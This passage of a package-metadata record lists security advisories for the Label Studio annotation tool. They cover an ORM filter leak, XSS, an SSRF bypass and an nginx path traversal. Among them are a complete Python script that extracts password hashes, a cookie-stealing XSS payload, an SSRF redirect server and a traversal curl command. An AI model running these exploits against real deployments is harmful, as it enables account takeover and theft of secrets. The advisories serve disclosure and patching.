exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.7.4.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.7.4.post0/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.18)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.7.4.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"e65a41192b0bdaa1e2ebd96d76af6f87869ba8d0a6e3eda870ca589fb4010cd3","md5":"be0c419a9cac36abd1ddc9f5f441a82d","sha256":"e189bcc360dbfc002f6a9e3d38dcd4c0b5d93b6bb74000fd57d6d588053114c3"},"downloads":-1,"filename":"label_studio-0.7.4.post0-py3-none-any.whl","has_sig":false,"md5_digest":"be0c419a9cac36abd1ddc9f5f441a82d","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6924851,"upload_time":"2020-08-17T13:51:55","upload_time_iso_8601":"2020-08-17T13:51:55.292337Z","url":"https://files.pythonhosted.org/packages/e6/5a/41192b0bdaa1e2ebd96d76af6f87869ba8d0a6e3eda870ca589fb4010cd3/label_studio-0.7.4.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"74851f90b4548c240a67a845fc22578d157ef525bfba7532ced730c73e203f2a","md5":"5f9f78fdf79e4e9f4d4d67910ba8f7dd","sha256":"9a07c8c14a6fb76ec12fdf63003d374a8e62a4863b0d608cbd21cdcc0e54507b"},"downloads":-1,"filename":"label-studio-0.7.4.post0.tar.gz","has_sig":false,"md5_digest":"5f9f78fdf79e4e9f4d4d67910ba8f7dd","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6853130,"upload_time":"2020-08-17T13:52:01","upload_time_iso_8601":"2020-08-17T13:52:01.563848Z","url":"https://files.pythonhosted.org/packages/74/85/1f90b4548c240a67a845fc22578d157ef525bfba7532ced730c73e203f2a/label-studio-0.7.4.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded 